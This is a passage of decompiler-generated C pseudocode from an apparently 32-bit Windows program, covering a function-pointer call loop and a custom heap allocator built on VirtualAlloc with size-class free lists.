			uint32 eax_53 = globals->dw405258;
			globals->dw405258 = eax_53 + 0x01;
			byte SCZO_59;
			byte C_60;
			word32 eax_61;
			word32 edx_62;
			byte Z_63;
			byte SZO_64;
			word32 ecx_65;
			(*((char *) globals->a405118 + eax_53 * 0x04))();
		} while (globals->dw405258 < 0x50);
	}
	if (globals->dw40525C != 0x00)
	{
		do
		{
			ui32 eax_38 = globals->dw40525C;
			globals->dw40525C = eax_38 - 0x01;
			byte SCZO_44;
			byte C_45;
			word32 eax_46;
			word32 edx_47;
			byte Z_48;
			byte SZO_49;
			word32 ecx_50;
			(*((char *) globals->a405118 + (eax_38 - 0x01) * 0x04))();
		} while (globals->dw40525C != 0x00);
	}
	*(esp_2 - 0x04) = ebx_19;
	fn004020C0(dwArg00);
	return;
}

// 004027E0: Register word32 fn004027E0(Stack word32 dwArg04)
word32 fn004027E0(word32 dwArg04)
{
	return dwArg04;
}

// 00402860: Register word32 fn00402860(Stack uint32 dwArg04)
word32 fn00402860(uint32 dwArg04)
{
	word32 eax_134;
	uint32 ebx_17 = (dwArg04 + 0x03 >> 0x0E) + 0x01 << 0x0E;
	***************************************************************************************************** eax_23 = fn004031F0(ebx_17 << 0x02);
	if (eax_23 == null)
	{
		globals->dw40505C = 0x00;
		eax_134 = 0x00;
	}
	else
	{
		uint32 esi_226;
		***************************************************************************************************** edi_224;
		if ((char *) globals->ptr4056A8 + globals->dw4056AC == eax_23)
		{
			esi_226 = (ebx_17 << 0x02) + globals->dw4056AC;
			edi_224 = Mem0[4216488:word32];
			ebx_17 = esi_226 >> 0x02;
		}
		else
		{
			edi_224 = eax_23;
			esi_226 = (char *) eax_23 + ((ebx_17 << 0x02) - eax_23);
		}
		globals->ptr4056A8 = (****************************************************************************************************) ((char *) edi_224 + ebx_17 * 0x04);
		globals->dw4056AC = -(ebx_17 << 0x02) + esi_226;
		if (globals->ptr405284 + 0x01 == edi_224 && globals->ptr40528C != null)
		{
			ui32 * edi_193 = (char *) edi_224 - 0x04;
			uint32 eax_196 = (*edi_193 & 0x7FFFFFFF) + ebx_17;
			*edi_193 = ebx_17 | 0x80000000;
			ui32 * edx_201 = globals->ptr405284 + ebx_17 * 0x04;
			globals->ptr405284 = edx_201;
			*(edx_201 - 0x04) = *edi_193;
			*globals->ptr405284 = eax_196 | 0x80000000;
			(globals->ptr405284 - (eax_196 << 0x02))->dw0004 = eax_196 | 0x80000000;
			fn00403110(edi_193 + 0x01);
			eax_134 = 0x01;
		}
		else
		{
			***************************************************************************************************** eax_75 = globals->ptr40528C;
			Mem76[0x0040528C:word32] = edi_224;
			Mem77[edi_224 + 0x00:word32] = eax_75;
			ui32 * edi_78 = (char *) edi_224 + 0x04;
			globals->ptr405284 = edi_78;
			uint32 ebx_79 = ebx_17 - 0x01;
			ui32 * eax_81 = globals->ptr405288;
			if (eax_81 == null || eax_81 > edi_78)
				globals->ptr405288 = edi_78;
			int32 eax_104;
			*edi_78 = ebx_79 | 0x80000000;
			ui32 * eax_89 = globals->ptr405284 - 0x04 + ebx_79 * 0x04;
			globals->ptr405284 = eax_89;
			*eax_89 = ebx_79 | 0x80000000;
			ui32 * eax_95 = globals->ptr405284;
			if (ebx_79 - 0x02 <= globals->dw40529C)
			{
				if (ebx_79 - 0x02 <= globals->dw405294)
					eax_104 = (word32) (ebx_79 - 0x02 > globals->dw405290);
				else if (ebx_79 - 0x02 <= globals->dw405298)
					eax_104 = 0x02;
				else
					eax_104 = 0x03;
			}
			else if (ebx_79 - 0x02 <= globals->dw4052A4)
				eax_104 = ((word32) (ebx_79 - 0x02 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (ebx_79 - 0x02 <= globals->dw4052A8)
				eax_104 = 0x06;
			else
				eax_104 = 0x07;
			ptr32 edx_110;
			globals->dw4052B4 = eax_104;
			ptr32 eax_106 = globals->a405260[eax_104 * 0x04];
			if (eax_106 == 0x00)
			{
				globals->a405260[globals->dw4052B4 * 0x04] = eax_95 - 0x04;
				edx_110 = eax_95 - 0x04;
				eax_106 = eax_95 - 0x04;
				if (globals->dw4052B0 > globals->dw4052B4)
					globals->dw4052B0 = globals->dw4052B4;
			}
			else
				edx_110 = *(eax_106 - 0x08);
			*(eax_95 - 0x08) = eax_106;
			*(eax_106 - 0x08) = eax_95 - 0x04;
			*(edx_110 - 0x04) = eax_95 - 0x04;
			*(eax_95 - 0x0C) = edx_110;
			(-(ebx_79 - 0x02 << 0x02) + (eax_95 - 0x04))->dw0004 = ebx_79 - 0x02;
			*(eax_95 - 0x04) = ebx_79 - 0x02;
			globals->a405260[globals->dw4052B4 * 0x04] = eax_95 - 0x04;
			while (true)
			{
				int32 eax_129 = globals->dw4052B0;
				if (globals->a405260[eax_129 * 0x04] != 0x00 || eax_129 >= 0x07)
					break;
				globals->dw4052B0 = globals->dw4052B0 + 0x01;
			}
			eax_134 = 0x01;
		}
	}
	return eax_134;
}

// 00402AB0: Register ptr32 fn00402AB0(Stack uint32 dwArg04)
ptr32 fn00402AB0(uint32 dwArg04)
{
	uint32 edx_19 = dwArg04 + 0x03 >> 0x02;
	uint32 ebx_102 = edx_19 + 0x02;
	if (edx_19 < ~0x01)
		ebx_102 = 0x04;
	int32 eax_31;
	if (ebx_102 <= globals->dw40529C)
	{
		if (ebx_102 <= globals->dw405294)
			eax_31 = (word32) (ebx_102 > globals->dw405290);
		else if (ebx_102 <= globals->dw405298)
			eax_31 = 0x02;
		else
			eax_31 = 0x03;
	}
	else if (ebx_102 <= globals->dw4052A4)
		eax_31 = ((word32) (ebx_102 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
	else if (ebx_102 <= globals->dw4052A8)
		eax_31 = 0x06;
	else
		eax_31 = 0x07;
	int32 esi_286 = eax_31;
	uint32 * edi_287 = null;
	uint32 dwLoc08_289 = 0x00;
	if (eax_31 < globals->dw4052B0)
	{
		esi_286 = globals->dw4052B0;
		dwLoc08_289 = 0x00;
		edi_287 = null;
	}
	while (dwLoc08_289 < ebx_102)
	{
		if (esi_286 >= 0x08)
			break;
		uint32 * eax_302 = globals->a405260[esi_286 * 0x04];
		esi_286 = esi_286 + 0x01;
		edi_287 = eax_302;
		if (eax_302 != null)
		{
			if (globals->ptr405284 + -0x01 == eax_302)
				edi_287 = *(eax_302 - 0x04);
			do
			{
				uint32 edx_315 = *edi_287;
				dwLoc08_289 = edx_315;
				if (edx_315 >= ebx_102)
					goto l00402B97;
				edi_287 = *(edi_287 - 0x04);
			} while (edi_287 != edi_287);
		}
	}
	ptr32 eax_115;
	if (dwLoc08_289 < ebx_102)
	{
		eax_115 = fn00402860(ebx_102);
		if (eax_115 == 0x00)
			return eax_115;
		esi_286 = globals->dw4052B4;
		edi_287 = globals->a405260[esi_286 * 0x04];
		dwLoc08_289 = *edi_287;
	}
	else if (esi_286 > 0x00)
		esi_286 = esi_286 - 0x01;
	uint32 eax_89 = dwLoc08_289 - ebx_102;
	if (eax_89 >= 0x04)
	{
		int32 dwLoc0C_120;
		if (eax_89 <= globals->dw40529C)
		{
			int32 edx_205;
			if (eax_89 <= globals->dw405294)
				edx_205 = (word32) (eax_89 > globals->dw405290);
			else if (eax_89 <= globals->dw405298)
				edx_205 = 0x02;
			else
				edx_205 = 0x03;
			dwLoc0C_120 = edx_205;
		}
		else if (eax_89 <= globals->dw4052A4)
			dwLoc0C_120 = ((word32) (eax_89 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
		else if (eax_89 <= globals->dw4052A8)
			dwLoc0C_120 = 0x06;
		else
			dwLoc0C_120 = 0x07;
		if (dwLoc0C_120 != esi_286)
		{
			uint32 * edx_127 = *(edi_287 - 0x04);
			if (edi_287 == edx_127)
			{
				globals->a405260[esi_286 * 0x04] = 0x00;
				if (globals->dw4052B0 == esi_286)
				{
					while (true)
					{
						int32 ecx_174 = globals->dw4052B0;
						if (globals->a405260[ecx_174 * 0x04] != 0x00)
							break;
						if (ecx_174 >= 0x07)
							break;
						globals->dw4052B0 = globals->dw4052B0 + 0x01;
					}
				}
			}
			else
			{
				ptr32 ecx_183 = *(edi_287 - 0x08);
				*(ecx_183 - 0x04) = edx_127;
				*(edx_127 - 0x08) = ecx_183;
				if (globals->a405260[esi_286 * 0x04] == edi_287)
					globals->a405260[esi_286 * 0x04] = ecx_183;
			}
			uint32 * dwLoc18_140;
			uint32 * edx_136 = globals->a405260[dwLoc0C_120 * 0x04];
			if (edx_136 == null)
			{
				globals->a405260[dwLoc0C_120 * 0x04] = edi_287;
				dwLoc18_140 = edi_287;
				edx_136 = edi_287;
				if (globals->dw4052B0 > dwLoc0C_120)
					globals->dw4052B0 = dwLoc0C_120;
			}
			else
				dwLoc18_140 = *(edx_136 - 0x08);
			*(edi_287 - 0x04) = edx_136;
			*(edx_136 - 0x08) = edi_287;
			*(dwLoc18_140 - 0x04) = edi_287;
			*(edi_287 - 0x08) = dwLoc18_140;
			(edi_287 + -(eax_89 << 0x02))[0x01] = eax_89;
			*edi_287 = eax_89;
		}
		else
		{
			(edi_287 + -(eax_89 << 0x02))[0x01] = eax_89;
			*edi_287 = eax_89;
		}
	}
	else
	{
		uint32 * eax_235 = *(edi_287 - 0x04);
		if (edi_287 == eax_235)
		{
			globals->a405260[esi_286 * 0x04] = 0x00;
			if (globals->dw4052B0 == esi_286)
			{
				while (true)
				{
					int32 edx_252 = globals->dw4052B0;
					if (globals->a405260[edx_252 * 0x04] != 0x00)
						break;
					if (edx_252 >= 0x07)
						break;
					globals->dw4052B0 = globals->dw4052B0 + 0x01;
				}
			}
		}
		else
		{
			ptr32 edx_260 = *(edi_287 - 0x08);
			*(edx_260 - 0x04) = eax_235;
			*(eax_235 - 0x08) = edx_260;
			if (globals->a405260[esi_286 * 0x04] == edi_287)
				globals->a405260[esi_286 * 0x04] = edx_260;
		}
		ebx_102 = dwLoc08_289;
	}
	word32 eax_107 = -(dwLoc08_289 * 0x02 * 0x02) + edi_287;
	ui32 eax_110 = ebx_102 | 0x80000000;
	eax_107[ebx_102 * 0x04 / 0x08] = (struct Eq_3036) eax_110;
	eax_107->dw0004 = eax_110;
	eax_115 = &eax_107->dw0004 + 0x01;
	return eax_115;
}

// 00402DB0: Register word32 fn00402DB0(Stack word32 dwArg04)
word32 fn00402DB0(word32 dwArg04)
{
	word32 esi_10 = 0x00;
	if (dwArg04 < globals->dw40505C)
		esi_10 = fn00402AB0(dwArg04);
	if (esi_10 == 0x00)
		esi_10 = fn00402020(dwArg04);
	if (esi_10 == 0x00)
		globals->dw4052BC = 0x0C;
	return esi_10;
}

// 00402DF0: void fn00402DF0(Stack uint32 dwArg04)
void fn00402DF0(uint32 dwArg04)
{
	if ((dwArg04->dwFFFFFFFC & 0x80000000) == 0x00)
		globals->dw4052BC = 22;
	else
	{
		ui32 eax_52 = dwArg04->dwFFFFFFFC;
		uint32 eax_197 = eax_52 & 0x7FFFFFFF;
		struct Eq_3186 * edx_298 = dwArg04 - 0x08 + (eax_52 & 0x7FFFFFFF) * 0x04;
		int32 dwLoc08_289 = dwLoc08 | ~0x00;
		if ((edx_298->dw0004 & 0x80000000) == 0x00)
		{
			int32 dwLoc0C_284;
			struct Eq_3186 * esi_280 = edx_298 + (edx_298->dw0004 * 0x04) / 0x08;
			if (esi_280->dw0000 <= globals->dw40529C)
			{
				int32 ecx_304;
				if (esi_280->dw0000 <= globals->dw405294)
					ecx_304 = (word32) (esi_280->dw0000 > globals->dw405290);
				else if (esi_280->dw0000 <= globals->dw405298)
					ecx_304 = 0x02;
				else
					ecx_304 = 0x03;
				dwLoc0C_284 = ecx_304;
			}
			else if (esi_280->dw0000 <= globals->dw4052A4)
				dwLoc0C_284 = ((word32) (esi_280->dw0000 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (esi_280->dw0000 <= globals->dw4052A8)
				dwLoc0C_284 = 0x06;
			else
				dwLoc0C_284 = 0x07;
			eax_197 = (eax_52 & 0x7FFFFFFF) + esi_280->dw0000;
			esi_280->dw0000 = eax_197;
			(esi_280 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
			dwLoc08_289 = dwLoc0C_284;
			edx_298 = esi_280;
		}
		if ((*(dwArg04 - 0x08) & 0x80000000) == 0x00)
		{
			int32 esi_202;
			eax_197 = eax_197 + *(dwArg04 - 0x08);
			if (*(dwArg04 - 0x08) <= globals->dw40529C)
			{
				int32 ecx_243;
				if (*(dwArg04 - 0x08) <= globals->dw405294)
					ecx_243 = (word32) (*(dwArg04 - 0x08) > globals->dw405290);
				else if (*(dwArg04 - 0x08) <= globals->dw405298)
					ecx_243 = 0x02;
				else
					ecx_243 = 0x03;
				esi_202 = ecx_243;
			}
			else if (*(dwArg04 - 0x08) <= globals->dw4052A4)
				esi_202 = ((word32) (*(dwArg04 - 0x08) <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
			else if (*(dwArg04 - 0x08) <= globals->dw4052A8)
				esi_202 = 0x06;
			else
				esi_202 = 0x07;
			ptr32 ecx_204 = *(dwArg04 - 0x0C);
			if (dwArg04 - 0x08 == ecx_204)
			{
				globals->a405260[esi_202 * 0x04] = 0x00;
				if (globals->dw4052B0 == esi_202)
				{
					while (true)
					{
						int32 esi_224 = globals->dw4052B0;
						if (globals->a405260[esi_224 * 0x04] != 0x00)
							break;
						if (esi_224 >= 0x07)
							break;
						globals->dw4052B0 = globals->dw4052B0 + 0x01;
					}
				}
			}
			else
			{
				ptr32 esi_232 = *(dwArg04 - 0x10);
				*(esi_232 - 0x04) = ecx_204;
				*(ecx_204 - 0x08) = esi_232;
				if (globals->a405260[esi_202 * 0x04] == dwArg04 - 0x08)
					globals->a405260[esi_202 * 0x04] = esi_232;
			}
			edx_298->dw0000 = eax_197;
			(edx_298 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
		}
		int32 ebx_163;
		if (eax_197 <= globals->dw40529C)
		{
			int32 ecx_161;
			if (eax_197 <= globals->dw405294)
				ecx_161 = (word32) (eax_197 > globals->dw405290);
			else if (eax_197 <= globals->dw405298)
				ecx_161 = 0x02;
			else
				ecx_161 = 0x03;
			ebx_163 = ecx_161;
		}
		else if (eax_197 <= globals->dw4052A4)
			ebx_163 = ((word32) (eax_197 <= globals->dw4052A0) - 0x01 & 0x01) + 0x04;
		else if (eax_197 <= globals->dw4052A8)
			ebx_163 = 0x06;
		else
			ebx_163 = 0x07;
		if (dwLoc08_289 != ebx_163)
		{
			if (dwLoc08_289 >= 0x00)
			{
				struct Eq_3186 * ecx_129 = *(edx_298 - 0x04);
				if (edx_298 == ecx_129)
				{
					globals->a405260[dwLoc08_289 * 0x04] = 0x00;
					if (globals->dw4052B0 == dwLoc08_289)
					{
						while (true)
						{
							int32 ebx_140 = globals->dw4052B0;
							if (globals->a405260[ebx_140 * 0x04] != 0x00)
								break;
							if (ebx_140 >= 0x07)
								break;
							globals->dw4052B0 = globals->dw4052B0 + 0x01;
						}
					}
				}
				else
				{
					ptr32 ebx_148 = *(edx_298 - 0x08);
					*(ebx_148 - 0x04) = (struct Eq_3186 **) ecx_129;
					*(ecx_129 - 0x08) = ebx_148;
					if (globals->a405260[dwLoc08_289 * 0x04] == edx_298)
						globals->a405260[dwLoc08_289 * 0x04] = ebx_148;
				}
			}
			struct Eq_3186 * ebx_107;
			struct Eq_3186 * ecx_106 = globals->a405260[ebx_163 * 0x04];
			if (ecx_106 == null)
			{
				globals->a405260[ebx_163 * 0x04] = edx_298;
				ebx_107 = edx_298;
				ecx_106 = edx_298;
				if (globals->dw4052B0 > ebx_163)
					globals->dw4052B0 = ebx_163;
			}
			else
				ebx_107 = (struct Eq_3186 *) *(ecx_106 - 0x08);
			*(edx_298 - 0x04) = (struct Eq_3186 **) ecx_106;
			*(ecx_106 - 0x08) = (struct Eq_3186 **) edx_298;
			*(ebx_107 - 0x04) = (struct Eq_3186 **) edx_298;
			*(edx_298 - 0x08) = (struct Eq_3186 **) ebx_107;
			(edx_298 + -(eax_197 << 0x02) / 0x08)->dw0004 = eax_197;
			edx_298->dw0000 = eax_197;
			globals->dw4052B4 = ebx_163;
			globals->a405260[ebx_163 * 0x04] = edx_298;
		}
	}
	return;
}

// 00403110: void fn00403110(Stack ptr32 dwArg04)
void fn00403110(ptr32 dwArg04)
{
	if (dwArg04 != 0x00)
	{
		if (dwArg04 - 0x04 > globals->ptr405288 && dwArg04 - 0x04 < globals->ptr405284)
			fn00402DF0(dwArg04);
		else
			fn00402060(dwArg04);
	}
	return;
}

// 004031F0: Register Eq_1186 fn004031F0(Stack ui32 dwArg04)
Eq_1186 fn004031F0(ui32 dwArg04)
{
	Eq_1186 eax_26;
	if (globals->t405054 == 0x00)
	{
		eax_26 = VirtualAlloc(0x00, globals->t405058, 0x2000, 0x01);
		globals->t405054 = eax_26;
		if (eax_26 == 0x00)
			return eax_26;
	}
	eax_26 = VirtualQuery(globals->t405054, fp - 0x20, 0x1C);
	if (eax_26 != 0x00)
	{
		Eq_1186 eax_53;
		if (dwLoc10 == 0x1000)
			eax_53 = (word32) globals->t405054 + dwLoc14;
		else
			eax_53 = globals->t405054;
		if (dwArg04 + eax_53 >=u Mem0[0x00405058:word32] + Mem0[0x00405054:word32])
			eax_26.u0 = 0x00;
		else
		{
			eax_26 = VirtualAlloc(eax_53, dwArg04, 0x1000, 0x04);
			if (eax_26 != 0x00)
				eax_26 = eax_53;
		}
	}
	return eax_26;
}

